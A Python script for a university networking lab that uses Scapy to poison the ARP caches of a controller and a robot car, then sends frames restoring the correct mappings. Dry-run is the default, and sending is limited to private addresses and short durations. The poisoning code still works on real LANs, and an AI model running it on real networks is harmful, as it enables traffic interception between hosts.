#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""实验五双端 ARP 报文练习。默认仅预览；网络发送需 --execute。

只使用现场预先记录的两端地址，不扫描网络，不修改系统转发设置。
退出时尝试发送正确映射；是否恢复必须在两端检查，不能由日志代替。
每条实质语句均有中文注释，便于理解后整理课程作业。
"""
import argparse  # 解析命令行参数。
import datetime as dt  # 为记录添加带时区的时间。
import ipaddress  # 检查 IPv4 地址。
import json  # 输出逐行 JSON 记录。
import os  # 检查是否以 root 运行。
import re  # 检查 MAC 地址格式。
import signal  # 让 Ctrl+C 和 TERM 进入清理路径。
import subprocess  # 只读取本机 ip route，不扫描或探测远端。
import time  # 用单调时钟限制运行时间。
from pathlib import Path  # 操作日志路径。


def ipv4(value):  # 将地址限制为常见实验室私有 IPv4 单播地址。
    addr = ipaddress.IPv4Address(value)  # 解析输入，格式不正确时抛出异常。
    ranges = ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  # 只允许 RFC1918 网段。
    if not any(addr in ipaddress.IPv4Network(n) for n in ranges):  # 排除公网、回环和组播。
        raise argparse.ArgumentTypeError("请输入实验室 RFC1918 私有 IPv4 地址")  # 给出具体错误。
    return str(addr)  # 返回规范化地址。


def mac(value):  # 校验现场填写的真实 MAC 地址。
    if not re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", value):  # 要求冒号分隔的六字节格式。
        raise argparse.ArgumentTypeError("MAC 格式应为 02:00:00:00:00:01")  # 拒绝模糊输入。
    value = value.lower()  # 统一小写，方便比较。
    if value == "00:00:00:00:00:00" or int(value[:2], 16) & 1:  # 排除全零、组播和广播源地址。
        raise argparse.ArgumentTypeError("MAC 必须为非零单播地址")  # 不采用任务文档的广播源写法。
    return value  # 返回规范化 MAC。


def parse_args(argv=None):  # 定义预览、发送及恢复参数。
    p = argparse.ArgumentParser(description=__doc__)  # 将说明显示在 --help 中。
    p.add_argument("--iface", required=True, help="攻击机 C 的实验网卡，如 ens33")  # 明确选择二层接口。
    p.add_argument("--controller", required=True, type=ipv4)  # 控制机 A 的现场 IPv4。
    p.add_argument("--controller-mac", required=True, type=mac)  # 中毒前记录的控制机真实 MAC。
    p.add_argument("--robot", required=True, type=ipv4)  # 小车 B 的现场 IPv4。
    p.add_argument("--robot-mac", required=True, type=mac)  # 中毒前记录的小车真实 MAC。
    p.add_argument("--attacker-mac", required=True, type=mac)  # 攻击机 C 的实验网卡 MAC。
    p.add_argument("--duration", type=float, default=20, help="发送持续秒数，范围 1 至 60")  # 默认短时演示。
    p.add_argument("--interval", type=float, default=2, help="两轮报文间隔秒数，范围 1 至 10")  # 不高频发包。
    p.add_argument("--execute", action="store_true", help="实际发送；默认只显示报文")  # 显式开启网络发送。
    p.add_argument("--restore-only", action="store_true", help="仅发送正确映射，仍需 --execute 才发送")  # 提供中断后清理入口。
    p.add_argument("--log", type=Path, help="新建 JSONL 日志，文件已存在则拒绝覆盖")  # 保留每次运行痕迹。
    a = p.parse_args(argv)  # 完成标准参数解析。
    if a.controller == a.robot or len({a.controller_mac, a.robot_mac, a.attacker_mac}) != 3:  # 两端与攻击机不能重合。
        p.error("两端 IPv4 必须不同，三台设备的 MAC 必须互不相同")  # 防止把自己或同一设备当两端。
    if not (1 <= a.duration <= 60 and 1 <= a.interval <= 10):  # 同时拒绝 NaN、无穷大和不合理速率。
        p.error("duration 应在 1 至 60，interval 应在 1 至 10")  # 限制实验持续时间。
    if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,32}", a.iface):  # 接口名作为参数而不是 shell 文本使用。
        p.error("网卡名称格式不正确")  # 拒绝空白等错误名称。
    return a  # 返回经过检查的参数。


def build_frames(a, Ether, ARP):  # 构造双向中毒帧及对应恢复帧。
    to_controller = Ether(src=a.attacker_mac, dst=a.controller_mac) / ARP(op=2, psrc=a.robot, hwsrc=a.attacker_mac, pdst=a.controller, hwdst=a.controller_mac)  # 告诉 A：B 的 IP 对应 C 的 MAC。
    to_robot = Ether(src=a.attacker_mac, dst=a.robot_mac) / ARP(op=2, psrc=a.controller, hwsrc=a.attacker_mac, pdst=a.robot, hwdst=a.robot_mac)  # 告诉 B：A 的 IP 对应 C 的 MAC。
    restore_controller = Ether(src=a.attacker_mac, dst=a.controller_mac) / ARP(op=2, psrc=a.robot, hwsrc=a.robot_mac, pdst=a.controller, hwdst=a.controller_mac)  # 以 C 的二层源发送正确映射，避免交换机把 B 的源 MAC 学到 C 端口。
    restore_robot = Ether(src=a.attacker_mac, dst=a.robot_mac) / ARP(op=2, psrc=a.controller, hwsrc=a.controller_mac, pdst=a.robot, hwdst=a.robot_mac)  # 告诉 B：A 的 IP 重新对应 A 的真实 MAC；仍需在端点核查。
    return [to_controller, to_robot], [restore_controller, restore_robot]  # 分别返回两个方向的帧。


def check_local(a, get_if_hwaddr, get_if_addr):  # 发送前只检查攻击机本地配置。
    if not hasattr(os, "geteuid") or os.geteuid() != 0:  # Linux 原始二层发送需要 root。
        raise RuntimeError("实际发送请在攻击机 Ubuntu 上使用 sudo python3")  # 不在 Windows 上尝试。
    if get_if_hwaddr(a.iface).lower() != a.attacker_mac:  # 与网卡实际 MAC 交叉核对。
        raise RuntimeError("attacker-mac 与所选网卡实际 MAC 不一致")  # 避免复制了旧地址。
    local_ip = get_if_addr(a.iface)  # 读取接口 IPv4，不发包。
    if local_ip in (a.controller, a.robot, "0.0.0.0"):  # 攻击机必须是第三个独立 IPv4 端点。
        raise RuntimeError("攻击机应为第三台独立端点，且该网卡须已有 IPv4")  # 容器共享控制机地址不合要求。
    for peer in (a.controller, a.robot):  # 分别检查到两端的本地路由。
        result = subprocess.run(["ip", "-j", "-4", "route", "get", peer], check=True, capture_output=True, text=True)  # 不调用 shell、不发送探测包。
        routes = json.loads(result.stdout)  # 解码本机路由查询结果。
        if not routes or routes[0].get("dev") != a.iface or routes[0].get("gateway") or routes[0].get("type", "unicast") != "unicast":  # 要求同接口直连单播，拒绝广播与本机路由。
            raise RuntimeError("端点不是所选接口的直接链路邻居；先处理桥接、地址和路由")  # 不通过路由器做本实验。


def main(argv=None):  # 程序主入口，默认不发包。
    a = parse_args(argv)  # 获取并校验参数。
    try:  # 将缺失依赖转成可读提示。
        from scapy.all import ARP, Ether, get_if_addr, get_if_hwaddr, sendp  # 导入 Scapy，不调用扫描或发送函数。
    except ImportError as exc:  # 安装前可能没有 Scapy。
        raise SystemExit("缺少 Scapy，请先 sudo apt install python3-scapy") from exc  # 指示 Ubuntu 依赖安装方式。
    poison, restore = build_frames(a, Ether, ARP)  # 纯内存构造四个帧。
    stream = a.log.open("x", encoding="utf-8") if a.log else None  # 独占新建日志，拒绝覆盖旧记录。

    def record(event, **fields):  # 统一记录时间、事件和本轮参数。
        row = {"time": dt.datetime.now().astimezone().isoformat(), "event": event, **fields}  # 保留明确时区。
        line = json.dumps(row, ensure_ascii=False)  # 输出便于后续核对的 JSON 行。
        print(line, flush=True)  # 终端实时显示。
        if stream:  # 用户请求文件日志时再写入。
            stream.write(line + "\n")  # 每个事件一行。
            stream.flush()  # 防止正常中断时丢失缓冲数据。

    def interrupted(signum, frame):  # 将两类常见中断转为可清理异常。
        raise KeyboardInterrupt  # 让发送部分的 finally 有机会执行。

    sent = False  # 标记是否已开始实际发送。
    old_handlers = {}  # 保存进程原有信号处理函数。
    try:  # 无论预览还是发送，最后都关闭日志。
        record("plan", execute=a.execute, restore_only=a.restore_only, iface=a.iface, controller=a.controller, robot=a.robot, duration=a.duration, interval=a.interval)  # 不包含任何密码。
        for packet in (restore if a.restore_only else poison):  # 预览本轮将使用的报文字段。
            print(packet.show(dump=True), flush=True)  # 仅格式化报文，不发送。
        if not a.execute:  # 默认路径到这里即结束。
            record("dry_run_no_packets_sent")  # 明确预览不等于现场实验。
            return 0  # 返回成功但未更改网络。
        check_local(a, get_if_hwaddr, get_if_addr)  # 只有显式发送时检查 Linux root 与本地接口。
        for sig in (signal.SIGINT, signal.SIGTERM):  # 处理 Ctrl+C 和 timeout 默认 TERM。
            old_handlers[sig] = signal.signal(sig, interrupted)  # 保存旧函数以便退出还原。
        sent = True  # 即使首轮部分失败也应尝试恢复。
        failure = None  # 分别保留发送故障和清理故障，避免后者覆盖前者。
        try:  # 将发送循环和恢复清理成对组织。
            if not a.restore_only:  # 恢复模式跳过中毒循环。
                end = time.monotonic() + a.duration  # 不受系统校时影响的截止时刻。
                while time.monotonic() < end:  # 到时自动退出，不常驻。
                    sendp(poison, iface=a.iface, verbose=False)  # 以指定二层接口单播发送两个方向。
                    record("poison_pair_sent")  # 只证明发包函数返回，不证明两端接受。
                    time.sleep(min(a.interval, max(0, end - time.monotonic())))  # 低频等待剩余时间。
        except KeyboardInterrupt:  # 用户中止时继续执行恢复部分。
            record("interrupted")  # 保留中止痕迹。
        except Exception as exc:  # 发送失败时也进入清理，并保存最初原因。
            failure = exc  # 保存原始异常供最后返回失败状态。
            record("poison_error", error=str(exc))  # 清理再失败也不丢原始证据。
        finally:  # 正常结束、发送异常和常见中断都尝试清理。
            try:  # 单独捕获恢复错误，不将其误报为中毒发送错误。
                sendp(restore, iface=a.iface, count=5, inter=0.2, verbose=False)  # 重复发送两端正确映射。
                record("restore_frames_sent_verify_both_endpoints")  # 不宣称邻居表已经恢复。
            except Exception as exc:  # 网卡消失、权限等可使清理失败。
                record("restore_error", error=str(exc))  # 清楚保留需要人工恢复的原因。
                if failure is None:  # 尚无发送故障时以恢复故障作为退出原因。
                    failure = exc  # 恢复失败也必须返回非零。
        if failure is not None:  # 任一阶段失败都不能伪装为成功。
            raise failure  # 交由外层统一记录并返回1。
        return 0  # 无未处理错误时返回。
    except Exception as exc:  # 将可预见故障写入日志并返回非零。
        record("error", error=str(exc), sending_started=sent)  # 失败不伪装成成功。
        return 1  # 提醒现场人工检查与恢复。
    finally:  # 收尾进程状态和本地文件。
        for sig, handler in old_handlers.items():  # 恢复进入程序前的信号处理。
            signal.signal(sig, handler)  # 不改变调用者之后的运行方式。
        if stream:  # 只有打开过日志才关闭。
            stream.close()  # 刷新并关闭文件。


if __name__ == "__main__":  # 仅在直接运行脚本时启动。
    raise SystemExit(main())  # 将返回值传给命令行。
